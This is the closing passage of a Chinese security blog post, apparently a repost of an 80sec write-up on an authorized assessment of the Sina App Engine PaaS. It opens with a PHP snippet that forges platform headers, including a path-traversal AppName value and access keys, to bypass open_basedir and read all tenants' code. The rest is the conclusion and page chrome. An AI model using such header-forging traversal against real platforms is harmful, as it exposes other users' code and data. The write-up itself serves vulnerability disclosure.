+'header' =&gt; "Host: wooyun.sinaapp.com\r\nX-Forwarded-For: 61.135.165.180, 61.135.165.180\r\nAppName: webmanage/1/:/:/../../../\r\nAccessKey: ynztttt1k1\r\nSecretKey: 1zhwzm5l4yzzzzyj54xiim5ddywwzill342l5lk5\r\nAppHash: 928\r\nMysqlPort: 3307\r\nAppCookie: default_version=1;xhprof=;debug=1;\r\nConnection: close\r\nCookie: saeut=220.181.50.244.1321955938519836\r\nAppVersion: 1",
+'protocol_version' =&gt; '1.1'
+)
+);
+stream_context_set_default($opt);
+$d = stream_context_get_default();
+var_dump(file_get_contents(http://10.67.15.23/phpinfo.php));</pre>
+<p style="text-indent:2em;">
+	注意AppName: webmanage/1/:/:/../../../，这个时候webmanage下得所有请求都将是绕过了open_basedir的限制的，我们顺利的访问到了所有用户的代码资源，包括SAE平台执行环境的资源；
+</p>
+<p style="text-indent:2em;">
+	我们在获得了数据权限之后尝试对sae的系统环境进行了突破，也发现了一些问题，但是没有得到实质的突破，将来有机会会再次分享 ：）
+</p>
+<p style="text-indent:2em;">
+	5 总结
+</p>
+<p style="text-indent:2em;">
+	SAE在设计的时候就考虑了安全性，并且防护非常严密，在易用性和安全性中实现了一个优雅的平衡，但是我们也可以看到对于paas的设计来讲，由于需要允许用户的代码尽量友好高效的运行，所以很容易在一些安全策略实现的细节当中出现一些问题，作为paas应用上下文的特殊性，其他的paas厂商在实现和设计的时候更应该严格注意这些安全问题，避免给平台和用户造成安全损失。
+</p>
+<p style="text-indent:2em;">
+	本站内容均为原创，转载请务必保留署名与链接！
+</p>
+<p style="text-indent:2em;">
+	从对SAE的一次授权安全评估浅谈云安全:http://www.80sec.com/sae-security.html
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">80sec</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2011-12-20
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/%E5%AE%89%E5%85%A8/">安全</a>
+          <a href="https://lcx.cc/tags/%E4%BA%91/">云</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/cookie/">cookie</a>
+          <a href="https://lcx.cc/tags/ftp/">FTP</a>
+          <a href="https://lcx.cc/tags/hash/">Hash</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/mysql/">Mysql</a>
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/root/">Root</a>
+          <a href="https://lcx.cc/tags/sql/">SQL</a>
+          <a href="https://lcx.cc/tags/web/">Web</a>
+          <a href="https://lcx.cc/tags/wooyun/">wooyun</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8B%E8%AF%95/">测试</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">代码执行</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1/">服务</a>
+          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+          <a href="https://lcx.cc/tags/%E7%9B%91%E6%8E%A7/">监控</a>
+          <a href="https://lcx.cc/tags/%E6%A3%80%E6%B5%8B/">检测</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/%E6%B2%99%E7%9B%92/">沙盒</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%BB%9C/">网络</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          <a href="https://lcx.cc/tags/%E5%8D%8F%E8%AE%AE/">协议</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/2068/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">德国一男子性侵女儿30余年 被判入狱3年8个月</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/2067/">
+            <span class="next-text nav-default">强智教务管理系统漏洞</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
